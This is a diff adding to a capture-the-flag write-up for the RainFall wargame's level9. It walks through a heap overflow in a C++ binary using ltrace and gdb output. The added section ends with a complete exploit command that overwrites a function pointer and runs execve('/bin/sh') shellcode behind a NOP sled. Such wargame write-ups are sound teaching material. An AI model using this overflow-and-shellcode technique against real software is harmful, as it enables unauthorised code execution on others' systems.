@@ -169,11 +169,103 @@ End of assembler dump.
 
 which seems to be the equivalent for `operator-`.
 
+Last but not least, we know that it __segault when argument >= 109__:
+
 ## Exploit
 
-Here everything concerning the exploit description.
+We are going through the steps to exploit the binary but we are not going to last on how the program works. For more
+comprehensive insights about the binary please see the `source` file.
 
-Segault when argument >= 109:
+We notified before that 109 bytes-long argument made the program segfault. Using `ltrace` we have some hints how it
+happens:
+
+```console
+level9@RainFall:~$ ltrace ./level9 `python -c 'print "A" * 108'`
+__libc_start_main(0x80485f4, 2, 0xbffff764, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                    = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                 = 0
+_Znwj(108, 0xbffff764, 0xbffff770, 0xb7d79e55, 0xb7fed280)                                            = 0x804a008
+_Znwj(108, 5, 0xbffff770, 0xb7d79e55, 0xb7fed280)                                                     = 0x804a078
+strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                         = 108
+memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 108)                                        = 0x0804a00c
+_ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x41414147, 0x804a078, 0x8048738, 0x804a00c)                       = 0xb7fce4a0
++++ exited (status 71) +++
+level9@RainFall:~$ ltrace ./level9 `python -c 'print "A" * 109'`
+__libc_start_main(0x80485f4, 2, 0xbffff764, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                    = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                 = 0
+_Znwj(108, 0xbffff764, 0xbffff770, 0xb7d79e55, 0xb7fed280)                                            = 0x804a008
+_Znwj(108, 5, 0xbffff770, 0xb7d79e55, 0xb7fed280)                                                     = 0x804a078
+strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                         = 109
+memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 109)                                        = 0x0804a00c
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+So far:
+- we notice the `dst` address is `0x0804a00c`,
+- we know it segfaults after the 108th bytes.
+
+We will use a 112 bytes long argument, in `gdb`:
+
+```gdb
+gdb-peda$ run $(python -c 'print "A" * 112')
+```
+
+Thus, we have a `memcpy` just before segfaulting. In fact it copies our argument at the address `0x0804a00c`. Using
+`gdb` we can understand how it works: `memcpy` is called inside the function `_ZN1N13setAnnotationEPc`. Since it is the
+last call `eax` returns the pointer to the `memcpy`'s `dst` buffer (which is `0x804a00c`). After, we have the following
+sequence:
+
+```gdb
+[...]
+   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
+   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
+   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
+   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
+   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
+   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
+   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
+   0x08048693 <+159>:   call   edx
+[...]
+```
+
+It prepares several arguments to `call   edx`. Consequently, `edx` contains a function pointer. Let's break all the
+steps:
+
+```gdb
+   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
+```
+
+Load `[esp+0x10]` to `eax` (`[esp+0x10]` contains the 109th to 112th bytes of our argument: `'AAAA'`). It is the 4 bytes
+just after our buffer (used as `dst` by `memcpy`). Since we have the rights to write onto this address: this is the
+_weakness_.
+
+```gdb
+   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
+   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
+```
+
+Here we have a double dereferencement of `eax`. With `"A" * 112` as argument it obviously segfault. Here is why: we
+allready know that if teh argument is bigger than 108 bytes, then it segfaults. After the 108th bytes `memcpy` seems to
+copy an address where we shouldn't have access. Since `0x08048682 <+142>:   mov    edx,DWORD PTR [eax]` try to put the
+content pointed by `eax` into `edx` it will segfault because this address is now `0x41414141`.
+
+Since we know that, put the address of the beginning of our buffer (`\x0c\xa0\x04\x08` or `0x0804a00c`, the `dst` of
+`memcpy`) to see what is going to happen. The argument now looks like:
+
+```gdb
+gdb-peda$ run $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')
+```
+
+Again, it segfaults but this time later:
+
+```gdb
+=> 0x8048693 <main+159>:    call   edx
+```
+
+`edx` has loaded our argument end: `0x41414141 ('AAAA')`. It is easy to think about the exploit: let's put a shellcode
+in order to execute `execve("/bin/sh", ["/bin/sh"], NULL)` (refers to `level2/Ressources`). The final exploit is like:
 
 ```console
 level9@RainFall:~$ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x90"*14 + "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*54 + "\x0c\xa0\x04\x08"'`
